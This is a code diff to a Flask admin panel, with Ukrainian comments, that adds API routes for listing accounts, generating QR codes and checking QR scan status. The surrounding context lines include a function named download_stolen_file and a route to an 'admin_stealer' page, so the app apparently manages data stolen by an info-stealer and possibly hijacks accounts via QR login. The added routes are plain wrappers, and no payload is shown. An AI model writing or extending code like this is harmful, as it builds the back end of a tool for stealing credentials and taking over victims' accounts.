@@ -710,3 +710,37 @@ def download_stolen_file(file_id):
         return redirect(url_for('admin.admin_stealer'))
     finally:
         db_session.close()
+
+# web/admin/routes.py - додати ці маршрути десь після інших маршрутів
+
+@admin_bp.route('/api/accounts')
+@login_required
+def admin_api_accounts():
+    """API для отримання акаунтів (для зворотної сумісності)"""
+    try:
+        # Використовуємо API з основного маршруту
+        from web.api.routes import api_get_accounts
+        return api_get_accounts()
+    except Exception as e:
+        logger.error(f"Admin API accounts error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@admin_bp.route('/api/generate_qr')
+@login_required  
+def admin_api_generate_qr():
+    """API для генерації QR (для зворотної сумісності)"""
+    try:
+        from web.api.routes import api_generate_qr
+        return api_generate_qr()
+    except Exception as e:
+        logger.error(f"Admin API QR error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@admin_bp.route('/api/check_qr')
+@login_required
+def admin_api_check_qr():
+    """Перевірка статусу QR коду (заглушка)"""
+    return jsonify({
+        'status': 'waiting',
+        'message': 'QR код в очікуванні сканування'
+    })
